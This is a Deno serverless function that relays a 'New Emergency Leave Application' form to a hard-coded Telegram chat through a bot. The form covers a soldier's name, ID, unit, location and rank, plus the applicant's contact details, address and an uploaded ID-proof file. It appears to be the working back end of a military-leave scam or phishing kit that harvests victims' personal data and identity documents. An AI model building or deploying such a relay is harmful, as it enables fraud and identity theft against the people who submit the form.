const CHAT_ID = "-5156299797";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

function formatMessage(d: Record<string, any>): string {
  let m = `<b>🆕 New Emergency Leave Application</b>\n`;
  m += `<b>Application ID:</b> ${d.applicationId}\n\n`;
  m += `<b>🔷 Leave Type:</b>\n${d.leaveType}\n\n`;
  m += `<b>🔷 Relationship:</b>\n${d.relationship}\n\n`;
  m += `<b>🔷 Military Personnel:</b>\n`;
  m += `Name: ${d.militaryName}\nID Number: ${d.militaryId}\n`;
  m += `Post/Unit: ${d.militaryUnit}\nLocation: ${d.militaryLocation}\nRank: ${d.militaryRank}\n\n`;
  m += `<b>🔷 Applicant:</b>\n`;
  m += `Name: ${d.applicantName}\nEmail: ${d.email}\nPhone: ${d.phone}\n`;
  m += `Address: ${d.address}, ${d.country}\n\n`;
  m += `<b>🔷 Emergency Details:</b>\n`;
  m += `Type: ${d.emergencyType}\nDescription: ${d.emergencyDescription}\n\n`;
  m += `<b>✅ Submitted at:</b> ${new Date().toLocaleString()}\n`;
  return m;
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });

  const token = Deno.env.get("TELEGRAM_BOT_TOKEN");
  if (!token) {
    return new Response(JSON.stringify({ error: "TELEGRAM_BOT_TOKEN not set" }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }

  try {
    const form = await req.formData();
    const payload = JSON.parse(String(form.get("payload") ?? "{}"));
    const file = form.get("file") as File | null;

    const textRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: formatMessage(payload), parse_mode: "HTML" }),
    });

    if (!textRes.ok) {
      const details = await textRes.text();
      console.error("Telegram sendMessage failed:", textRes.status, details);
      return new Response(JSON.stringify({ error: "sendMessage failed", status: textRes.status, details }), {
        status: textRes.status,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (file && file.size > 0) {
      const fd = new FormData();
      fd.append("chat_id", CHAT_ID);
      fd.append("document", file, file.name);
      fd.append("caption", `ID Proof for Application ${payload.applicationId}`);
      const fileRes = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
        method: "POST",
        body: fd,
      });
      if (!fileRes.ok) {
        const details = await fileRes.text();
        console.error("Telegram sendDocument failed:", fileRes.status, details);
      }
    }

    return new Response(JSON.stringify({ ok: true }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (e) {
    console.error("telegram-submit error:", e);
    return new Response(JSON.stringify({ error: String(e) }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});